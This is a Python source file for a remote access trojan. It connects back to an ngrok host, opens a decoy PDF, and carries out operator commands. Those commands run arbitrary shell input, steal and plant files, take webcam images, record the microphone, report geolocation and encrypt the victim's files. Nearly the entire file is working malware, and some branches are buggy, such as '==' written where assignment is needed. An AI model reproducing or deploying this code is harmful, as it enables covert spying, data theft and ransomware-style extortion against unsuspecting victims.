import socket
import subprocess
import simplejson
import os
import base64
import cv2
import requests
import geocoder
import sounddevice as sd
import numpy as np
import wave
from cryptography.fernet import Fernet
import sys


class MySocket:

	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))

	def open_added_file(self):
		added_file = sys._MEIPASS + "\\file_name.pdf"
		subprocess.Popen(added_file,shell=True)


	def command_execution(self, command):
		try:
			result = subprocess.check_output(command,shell=True,stderr=subprocess.STDOUT,stdin=subprocess.PIPE)
			return result.decode('utf-8',errors='ignore')
		except Exception as e:
			return f"Command failed :{str(e)}"
		

	def json_send(self, data):
		try:
			json_data = simplejson.dumps(data,ensure_ascii=False)
			self.my_connection.send(json_data.encode("utf-8",errors='replace'))
		except Exception as e:
			print(f"Error sending JSON data: {e}")
	

	def json_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(4096).decode('utf-8',errors='replace')
				return simplejson.loads(json_data)
			except ValueError:
				continue
			except Exception as e:
				print(f"Error receiving JSON data : {e}")
				break

	def execute_cd_command(self,directory):
		os.chdir(directory)
		return "Cd to " + directory



	def get_file_contents(self,path):
		try:
			with open(path,"rb") as my_file:
				return base64.b64encode(my_file.read()).decode('utf-8')
		except Exception as e:
			return f"Error reading file : {e}"


	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Download OK"

	def capture_image(self):
		camera = cv2.VideoCapture(0)
		return_value, image = camera.read()
		camera.release()

		retval,buffer = cv2.imencode('.jpg',image)
		jpg_as_text = base64.b64encode(buffer).decode('utf-8')

		return jpg_as_text
	def get_geolocation(self):
	    try:
	        # Yerel IP adresini al
	        g = geocoder.ip('me')

	        # Konum bilgilerini kontrol et
	        if g.ok:
	            location_info = {
	                "IP": g.ip,
	                "City": g.city,
	                "Region": g.state,
	                "Country": g.country,
	                "Latitude": g.lat,
	                "Longitude": g.lng
	            }

	            return f"IP: {location_info['IP']}, City: {location_info['City']}, Region: {location_info['Region']}, Country: {location_info['Country']}, Latitude: {location_info['Latitude']}, Longitude: {location_info['Longitude']}"
	        else:
	            return "Error in fetching geolocation: Could not retrieve location information."

	    except Exception as e:
	        return f"Error in fetching geolocation: {str(e)}"

	def record_audio(self,duration=5,fs=44100):
		print("Recording audio...")
		recording = sd.rec(int(duration*fs),samplerate=fs,channels=2)
		sd.wait()

		wav_output = wave.open("audio_output.wav",'wb')
		wav_output.setnchannels(2)
		wav_output.setsampwidth(4)
		wav_output.setframerate(fs)
		wav_output.writeframes(recording.tobytes())
		wav_output.close()

		with open("audio_output.wav",'rb') as audio_file:
			return base64.b64encode(audio_file.read()).decode('utf-8')


	def encrypt_files(self):
		file_list=[]
		for file in os.listdir():
			if file in ["generatedkey.key"]:
				continue
			if os.path.isfile(file):
				file_list.append(file)

		if not os.path.exists("generatedkey.key"):
			key = Fernet.generate_key()
			with open("generatedkey.key","wb") as generatedkey:
				generatedkey.write(key)

		else:
			with open("generatedkey.key","rb") as generatedkey:
				key = generatedkey.read()

		#print("Key 1 : ", key)

		for file in file_list:
			with open(file,"rb") as the_file:
				contents = the_file.read()
			contents_encrypted = Fernet(key).encrypt(contents)
			with open(file,"wb") as the_file:
				the_file.write(contents_encrypted)


		return f"Encrypted {len(file_list)} files.Key saved as 'generatedkey.key'"

	def decrypt_files(self):
		file_list = []
		try:
			with open("generatedkey.key","rb") as key_file:
				key = key_file.read()

			#print("Key 2: ", key)

			cipher = Fernet(key)

			for file in os.listdir():
				if file in ["generatedkey.key"]:
					continue
				if os.path.isfile(file):
					file_list.append(file)

			for file in file_list:
				with open(file,"rb") as the_file:
					encrypted_contents = the_file.read()
				decrypted_contents = cipher.decrypt(encrypted_contents)


				with open(file,"wb") as the_file:
					the_file.write(decrypted_contents)

			return f"Decrypted {len(file_list)} files."

		except Exception as e:
			return f"Decrytped failed : {str(e)}"




	def start_socket(self):
		self.open_added_file()
		while True:
			
			command = self.json_receive()
			try:
				if command[0] == "quit":
					self.my_connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					directory = " ".join(command[1:])
					try:
						command_output = self.execute_cd_command(directory)
					except FileNotFoundError:
						command_output = f"Directory not found: {directory}"
					except OSError as e:
						command_output = f"OS error: {e}"
					
				elif command[0] == "download":
					command_output = self.get_file_contents(command[1])
				elif command[0] == "upload":
					command_output = self.save_file(command[1],command[2])
				elif command[0] == "camera":
					command_output = self.capture_image()
				elif command[0] == "location":
					command_output = self.get_geolocation()
				elif command[0] == "mic":
					command_output = self.record_audio(duration=int(command[1]))
				elif command[0] == "encrypt":
					command_output == self.encrypt_files()
				elif command[0] == "decrypt":
					command_output == self.decrypt_files()
				else:
					command_output = self.command_execution(command)
			except Exception:
				command_output = "Error!"


			self.json_send(command_output)
		self.my_connection.close()

my_socket_object = MySocket("number.tcp.eu.ngrok.io",port_number)
my_socket_object.start_socket()